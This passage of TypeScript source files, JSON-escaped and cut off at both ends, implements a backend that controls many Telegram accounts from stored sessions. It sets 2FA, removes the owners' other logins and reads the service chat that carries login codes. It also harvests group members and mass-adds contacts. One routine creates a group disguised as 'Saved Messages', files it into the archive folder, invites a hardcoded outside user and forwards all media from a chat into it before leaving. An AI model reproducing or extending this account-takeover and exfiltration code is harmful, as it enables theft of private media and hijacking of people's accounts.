summary: 'Set 2Fa' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: '2Fa set successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async set2Fa(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.set2Fa(mobile);\n    }\n\n    @Get('setprofilepic/:mobile/:name')\n    @ApiOperation({ summary: 'Set Profile Picture' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    @ApiParam({ name: 'name', description: 'Profile name', type: String })\n    async setProfilePic(\n        @Param('mobile') mobile: string,\n        @Param('name') name: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.setProfilePic(mobile, name)\n    }\n\n    @Get('updatePrivacy/:mobile')\n    @ApiOperation({ summary: 'Update Privacy Settings' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    async updatePrivacy(\n        @Param('mobile') mobile: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.updatePrivacy(mobile)\n    }\n\n    @Get('UpdateUsername/:mobile')\n    @ApiOperation({ summary: 'Update Username' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    @ApiQuery({ name: 'username', description: 'New username', type: String, required: false })\n    async updateUsername(\n        @Param('mobile') mobile: string,\n        @Query('username') username: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.updateUsername(mobile, username)\n    }\n\n    @Get('getGrpMembers/:mobile')\n    @ApiOperation({ summary: 'Update Username' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    @ApiQuery({ name: 'username', description: 'New username', type: String })\n    async getGrpMembers(\n        @Param('mobile') mobile: string,\n        @Query('username') username: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getGrpMembers(mobile, username)\n    }\n\n    \n\n    @Post('addcontact')\n    @ApiOperation({ summary: 'Add multiple contacts' })\n    @ApiBody({\n        description: 'Add contacts with a phone number array and a prefix for names',\n        type: AddContactDto\n    })\n    @ApiResponse({\n        status: 200,\n        description: 'Successfully added contacts.',\n        schema: {\n            example: {\n                success: true,\n                addedContacts: 5,\n            },\n        },\n    })\n    @ApiResponse({\n        status: 400,\n        description: 'Error adding contacts.',\n        schema: {\n            example: {\n                success: false,\n                error: 'Error message',\n            },\n        },\n    })\n    async addContact(@Body() addContactDto: AddContactDto) {\n        const { mobile, data, prefix } = addContactDto;\n        await this.connectToTelegram(mobile);\n        return this.telegramService.addContact(mobile, data, prefix);\n    }\n\n\n    @Post('addcontacts')\n    @ApiOperation({ summary: 'Add multiple contacts' })\n    @ApiBody({\n        description: 'Add contacts with a phone number array and a prefix for names',\n        type: AddContactsDto\n    })\n    @ApiResponse({\n        status: 200,\n        description: 'Successfully added contacts.',\n        schema: {\n            example: {\n                success: true,\n                addedContacts: 5,\n            },\n        },\n    })\n    @ApiResponse({\n        status: 400,\n        description: 'Error adding contacts.',\n        schema: {\n            example: {\n                success: false,\n                error: 'Error message',\n            },\n        },\n    })\n    async addContacts(@Body() addContactsDto: AddContactsDto) {\n        const { mobile, phoneNumbers, prefix } = addContactsDto;\n        await this.connectToTelegram(mobile);\n        return this.telegramService.addContacts(mobile, phoneNumbers, prefix);\n    }\n\n    @Get('newSession/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    async newSession(\n        @Param('mobile') mobile: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.createNewSession(mobile)\n    }\n\n    @Get('updateNameandBio/:mobile')\n    @ApiOperation({ summary: 'Update Name' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    @ApiQuery({ name: 'firstName', description: 'First Name', type: String })\n    @ApiQuery({ name: 'about', description: 'About', type: String })\n    async updateName(\n        @Param('mobile') mobile: string,\n        @Query('firstName') firstName: string,\n        @Query('about') about: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.updateNameandBio(mobile, firstName, about)\n    }\n\n    @Get('metadata')\n    async getMediaMetadata(@Query('mobile') mobile: string, @Query('chatId') chatId: string, @Query('offset') offset: number, @Query('limit') limit: number) {\n        await this.telegramService.createClient(mobile, false, false);\n        return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);\n    }\n\n    @Get('download')\n    async downloadMediaFile(\n        @Query('mobile') mobile: string,\n        @Query('messageId') messageId: number,\n        @Query('chatId') chatId: string,\n        @Res() res: any\n    ) {\n        await this.connectToTelegram(mobile);\n        await this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\n    }\n\n    @Get('downloadProfilePic')\n    async downloadProfilePic(\n        @Query('mobile') mobile: string,\n        @Query('index') index: number,\n        @Res() res: any\n    ) {\n        await this.connectToTelegram(mobile);\n        try {\n            const filePath = await this.telegramService.downloadProfilePic(mobile, index);\n            if (!filePath) {\n                return res.status(404).send('Profile photo not found.');\n            }\n\n            res.download(filePath, 'profile_pic.jpg', (err) => {\n                if (err) {\n                    console.error('Error sending the file:', err);\n                    res.status(500).send('Error downloading the file.');\n                }\n\n                fs.unlink(filePath, (err) => {\n                    if (err) {\n                        console.error('Error deleting the file:', err);\n                    }\n                });\n            });\n        } catch (error) {\n            console.error('Error in endpoint:', error);\n            res.status(500).send('An error occurred.');\n        }\n    }\n\n\n    @Get('forward/:mobile/:chatId/:messageId')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\n    @ApiParam({ name: 'messageId', description: 'messageId of message', type: String })\n    async forrward(\n        @Param('mobile') mobile: string,\n        @Param('chatId') chatId: string,\n        @Param('messageId') messageId: number,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.forwardMessage(mobile, chatId, messageId)\n    }\n\n    @Get('deleteChat/:mobile/:chatId')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    @ApiParam({ name: 'chatId', description: 'chatId of user', type: String })\n    async deleteChat(\n        @Param('mobile') mobile: string,\n        @Param('chatId') chatId: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.deleteChat(mobile, chatId)\n    }\n\n    @Get('deleteProfilePics/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n    async deleteProfilePics(\n        @Param('mobile') mobile: string,\n    ) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.deleteProfilePhotos(mobile)\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { TelegramService } from './Telegram.service';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\n\n@Module({\n    imports: [\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)],\n    controllers: [TelegramController],\n    providers: [TelegramService],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { BufferClientService } from './../buffer-clients/buffer-client.service';\nimport { UsersService } from '../users/users.service';\nimport { contains, parseError, sleep } from \"../../utils\";\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { Api, TelegramClient } from 'telegram';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private static clientsMap: Map<string, TelegramManager> = new Map();\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {}\n\n    async onModuleDestroy() {\n        await this.disconnectAll();\n    }\n\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    public async getClient(number: string) {\n        const client = TelegramService.clientsMap.get(number);\n        try {\n            if (client && client.connected()) {\n                await client.connect()\n                return client\n            }\n        } catch (error) {\n            console.log(error)\n        }\n        return undefined;\n    }\n\n    public hasClient(number: string) {\n        return TelegramService.clientsMap.has(number);\n    }\n\n    async deleteClient(number: string) {\n        const cli = await this.getClient(number);\n        await cli?.disconnect();\n        console.log(\"Disconnected : \", number)\n        return TelegramService.clientsMap.delete(number);\n    }\n\n    async disconnectAll() {\n        const data = TelegramService.clientsMap.entries();\n        console.log(\"Disconnecting All Clients\");\n        for (const [phoneNumber, client] of data) {\n            try {\n                await client?.disconnect();\n                TelegramService.clientsMap.delete(phoneNumber);\n                console.log(`Client disconnected: ${phoneNumber}`);\n            } catch (error) {\n                console.log(parseError(error));\n                console.log(`Failed to Disconnect : ${phoneNumber}`);\n            }\n        }\n        TelegramService.clientsMap.clear();\n        // this.bufferClientService.clearBufferMap()\n        this.bufferClientService.clearJoinChannelInterval()\n    }\n\n    async createClient(mobile: string, autoDisconnect = true, handler = true): Promise<TelegramManager> {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        if (!this.hasClient(mobile)) {\n            let telegramManager = new TelegramManager(user.session, user.mobile);\n            let client: TelegramClient\n            try {\n                client = await telegramManager.createClient(handler);\n                await client.getMe();\n                if (client) {\n                    TelegramService.clientsMap.set(mobile, telegramManager);\n                    if (autoDisconnect) {\n                        setTimeout(async () => {\n                            if (client.connected || await this.getClient(mobile)) {\n                                console.log(\"SELF destroy client : \", mobile);\n                                await telegramManager.disconnect();\n                            } else {\n                                console.log(\"Client Already Disconnected : \", mobile);\n                            }\n                            TelegramService.clientsMap.delete(mobile);\n                        }, 180000)\n                    } else {\n                        setInterval(async () => {\n                            //console.log(\"destroying loop :\", mobile)\n                            //client._destroyed = true\n                            // if (!client.connected) {\n                            // await client.connect();\n                            //}\n                        }, 20000);\n                    }\n                    return telegramManager;\n                } else {\n                    throw new BadRequestException('Client Expired');\n                }\n            } catch (error) {\n                console.log(\"Parsing Error\");\n                if (telegramManager) {\n                    await telegramManager.disconnect();\n                    telegramManager = null;\n                    TelegramService.clientsMap.delete(mobile);\n                }\n                const errorDetails = parseError(error);\n                if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                    console.log(\"Deleting User: \", user.mobile);\n                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });\n                } else {\n                    console.log('Not Deleting user');\n                }\n                throw new BadRequestException(errorDetails.message)\n            }\n        } else {\n            console.log(\"Client Already exists\")\n            return await this.getClient(mobile)\n        }\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await this.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    // async joinChannels(mobile: string, channels: Channel[]) {\n    //     console.log(\"Started Joining- \", mobile, \" - channelsLen - \", channels.length);\n\n    //     const joinChannelWithDelay = async (index: number) => {\n    //         const telegramClient = await this.createClient(mobile, false, false)\n    //         if (index >= channels.length) {\n    //             console.log(mobile, \" - finished joining channels\");\n    //             await this.deleteClient(mobile);\n    //             console.log(\"Join channel stopped : \", mobile);\n    //             return;\n    //         }\n\n    //         console.log(mobile, \" - Will Try next now\");\n    //         const channel = channels[index]\n    //         const username = channel.username;\n    //         console.log(mobile, \"Trying: \", username);\n    //         try {\n    //             await tryJoiningChannel(telegramClient, channel, username, mobile);\n    //         } catch (error) {\n    //             parseError(error, \"Outer Err: \");\n    //             await this.removeChannels(error, channel.channelId, channel.username);\n    //         }\n    //         console.log(mobile, \" - On waiting period\");\n    //         await this.deleteClient(mobile)\n    //         this.joinChannelTimeoutId = setTimeout(async () => {\n    //             joinChannelWithDelay(index + 1);\n    //         }, 3 * 60 * 1000);\n    //     };\n\n\n\n    //     joinChannelWithDelay(0);\n    //     return 'Channels joining in progress';\n    // }\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await this.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async removeOtherAuths(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        await telegramClient.removeOtherAuths();\n        return 'Authorizations removed successfully';\n    }\n\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardSecrets(mobile: string, fromChatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createGroupAndForward(fromChatId);\n    }\n\n\n    async joinChannelAndForward(mobile: string, fromChatId: string, channel: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.joinChannelAndForward(fromChatId, channel);\n    }\n\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false) {\n        const telegramClient = await this.getClient(mobile)\n        const result = await telegramClient.getDialogs({ limit: 10, archived: false })\n        // console.log(result)\n        return await telegramClient.channelInfo(sendIds);\n    }\n\n    async getAuths(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getAuths();\n    }\n\n    async getMe(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMe();\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            await telegramClient.disconnect();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await this.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            await telegramClient.disconnect();\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string, chatId: string, offset: number, limit: number) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.getMediaMetadata(chatId, offset, limit);\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, chatId: string, messageId: number) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.forwardMessage(chatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await this.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        return await telegramClient.leaveChannels(leaveChannelIds);\n    }\n\n\n    async leaveChannel(mobile: string, channel: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.leaveChannels([channel]);\n    }\n\n\n    async deleteChat(mobile: string, chatId: string) {\n        const telegramClient = await this.getClient(mobile)\n        return await telegramClient.deleteChat(chatId);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ) {\n        const telegramClient = await this.getClient(mobile)\n        try {\n            await telegramClient.updateProfile(firstName, about)\n            return \"Username updated successfully\";\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n}\n","import { TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport { Api } from 'telegram/tl';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { contains, fetchWithTimeout, parseError, ppplbot } from '../../utils';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { Dialog } from 'telegram/tl/custom/dialog';\nimport { LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport * as bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { disconnectAll } from '../TgSignup/TgSignup.service';\nimport { EntityLike } from 'telegram/define';\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n\n        // Logic to categorize the dialog to a folder\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        // Add users to the channel\n        const usersToAdd = [\"fuckyoubabie\"]; // Replace with the list of usernames or user IDs\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        return { id, accessHash };\n    }\n\n    public async createGroupAndForward(fromChatId: string) {\n        const { id, accessHash } = await this.createGroup();\n        await this.forwardSecretMsgs(fromChatId, id.toString());\n    }\n\n    public async joinChannelAndForward(fromChatId: string, channel: string) {\n        const result: any = await this.joinChannel(channel);\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: result.chats[0].id,\n                            accessHash: result.chats[0].accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        await this.forwardSecretMsgs(fromChatId, channel);\n    }\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        let limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n\n        await this.leaveChannels([toChatId]);\n        return;\n    }\n\n    //logic to forward messages from a chat to another chat maintaining rate limits\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                const result = await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async disconnect(): Promise<void> {\n        if (this.client) {\n            console.log(\"Destroying Client: \", this.phoneNumber)\n            // await this.client.destroy();\n            this.client._destroyed = true\n            await this.client.disconnect();\n            this.client = null;\n        }\n        this.session.delete();\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        parseError(error)\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            // await this.client.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\n            // Handle other types of errors\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: Function): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 5,\n        });\n        this.client.setLogLevel(LogLevel.ERROR);\n        this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats\n    }\n\n    async getLastMsgs(limit: number): Promise<string> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const msgs = await this.client.getMessages(\"777000\", { limit 